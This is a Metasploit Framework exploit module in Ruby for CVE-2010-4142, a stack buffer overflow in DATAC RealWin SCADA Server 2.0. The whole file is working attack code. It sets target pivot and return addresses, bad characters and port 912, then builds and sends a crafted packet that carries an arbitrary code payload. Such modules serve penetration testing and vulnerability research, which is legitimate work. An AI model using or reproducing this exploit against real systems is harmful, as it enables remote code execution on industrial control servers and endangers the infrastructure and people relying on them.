##
# $Id: realwin_scpc_txtevent.rb 11125 2010-11-24 13:44:46Z mc $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = GreatRanking

	include Msf::Exploit::Remote::Tcp

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'DATAC RealWin SCADA Server SCPC_TXTEVENT Buffer Overflow',
			'Description'    => %q{
					This module exploits a stack buffer overflow in DATAC Control
				International RealWin SCADA Server 2.0 (Build 6.1.8.10).
				By sending a specially crafted packet,
				an attacker may be able to execute arbitrary code.
			},
			'Author'         => [ 'Luigi Auriemma', 'MC' ],
			'License'        => MSF_LICENSE,
			'Version'        => '$Revision: 11125 $',
			'References'     =>
				[
					[ 'CVE', '2010-4142'],
					[ 'OSVDB', '68812'],
				],
			'Privileged'     => true,
			'DefaultOptions' =>
				{
					'EXITFUNC' => 'thread',
				},
			'Payload'        =>
				{
					'Space'    => 550,
					'BadChars' => "\x00\x20\x0a\x0d",
					'StackAdjustment' => -3500,
				},
			'Platform'       => 'win',
			'Targets'        =>
				[
					[ 'Universal', { 'Pivot' => 0x40017fc2, 'Ret' => 0x4001f6d0 } ],
				],
			'DefaultTarget' => 0,
			'DisclosureDate' => 'Nov 18 2010'))

		register_options([Opt::RPORT(912)], self.class)
	end

	def exploit

		connect

		data =  [0x6a541264].pack('V')
		data << [0x00000010].pack('V')
		data << [0x00001ff4].pack('V')
		data << rand_text_alpha_upper(164)
		data << [target['Pivot']].pack('V')
		data << rand_text_alpha_upper(16)
		data << [target.ret].pack('V')
		data << payload.encoded
		data << rand_text_alpha_upper(10024 - payload.encoded.length)

		print_status("Trying target #{target.name}...")
		sock.put(data)

		handler
		disconnect

	end

end
